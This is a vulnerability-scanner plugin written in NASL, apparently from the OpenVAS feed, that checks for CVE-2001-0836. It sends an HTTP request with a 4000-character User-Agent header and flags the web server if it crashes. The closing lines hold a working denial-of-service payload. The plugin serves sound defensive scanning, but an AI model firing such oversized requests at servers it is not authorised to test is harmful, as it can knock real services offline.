if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11069" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3443, 3449, 7054 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-0836" );
	script_name( "HTTP User-Agent overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It was possible to kill the web server by
  sending an invalid GET request with a too long User-Agent field." );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make the web server
  crash continually or even execute arbirtray code on your system." );
	script_tag( name: "affected", value: "Oracle9iAS Web Cache/2.0.0.1.0 is known to be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r = http_get( item: "/", port: port );
ua = egrep( pattern: "^User-Agent:", string: r );
if(ua){
	r = r - ua;
}
r = r - NASLString( "\\r\\n\\r\\n" );
r = NASLString( r, "\\r\\n", "User-Agent: ", crap( 4000 ), "\\r\\n\\r\\n" );
send( socket: soc, data: r );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

